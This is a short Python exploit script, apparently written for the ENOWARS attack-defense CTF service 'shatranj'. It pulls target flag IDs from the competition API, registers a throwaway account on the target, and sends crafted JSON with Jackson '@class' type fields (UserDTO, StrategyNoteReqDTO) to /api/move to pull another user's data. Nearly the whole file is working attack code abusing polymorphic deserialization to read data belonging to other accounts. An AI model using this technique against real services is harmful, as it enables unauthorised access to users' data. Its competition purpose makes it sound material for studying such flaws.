#!/usr/bin/python3
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid
import base64

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

#ip = sys.argv[1]
ip = sys.argv[1]
url = 'http://{}:8080'.format(ip)

s = requests.Session()

jsonResp = requests.get('https://5.enowars.com/api/attackinfo', timeout=(None,None)).json()
ips =  jsonResp['services']['shatranj']
ips_dict = dict(ips)

username = generator()
password = generator()

auth = {"username": username, "password": password}

s.post(url + '/api/register',json=auth, timeout=(None,None))

creds_base64 = base64.b64encode(bytes(username + ':' + password, "utf-8")).decode()

headers = {'Authorization' : 'Basic ' + creds_base64}

s.get(url + '/api/login',headers=headers, timeout=(None,None))

for item in ips_dict:
    if item == ip:
        for round in ips_dict[item]:
            entitys = ips_dict[item]

            first = entitys[round]['0'][0]
            #second = entitys[round]['1'][0]

            payload = '"@class": "org.shatranj.diwana.shatranjserver.dto.UserDTO","username":"{}","move": "d1f3"'.format(first)

            resp = s.post(url + '/api/move', headers=headers,data=payload, timeout=(None, None))
            hash = resp.json()[0]

            payload = '"@class": "org.shatranj.diwana.shatranjserver.dto.StrategyNoteReqDTO","id":"{}","move": "d1f3"'.format(hash)
            resp = s.post(url + '/api/move', headers=headers, data=payload, timeout=(None, None))
            print(resp.json()['message'], flush=True)







